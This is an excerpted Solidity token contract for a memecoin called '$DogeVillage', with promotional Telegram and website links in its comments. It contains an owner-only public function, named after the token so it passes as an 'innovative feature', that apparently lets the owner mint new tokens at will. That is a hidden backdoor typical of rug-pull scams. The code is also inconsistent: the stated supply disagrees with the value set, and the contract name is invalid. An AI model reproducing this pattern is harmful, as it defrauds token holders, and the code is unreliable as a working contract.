...
//
// $DogeVillage proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/DogeVillagePortal
//  📱Website :: https://DogeVillage.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DogeVillage(uint256 amount) public onlyOwner {
 _DogeVillage(msg.sender, amount);
    }
    ...
    function _DogeVillage(address account, uint256 amount) internal virtual {
...
contract $DogeVillage is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("$DogeVillage", "$DogeVillage") {
     _DogeVillage(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}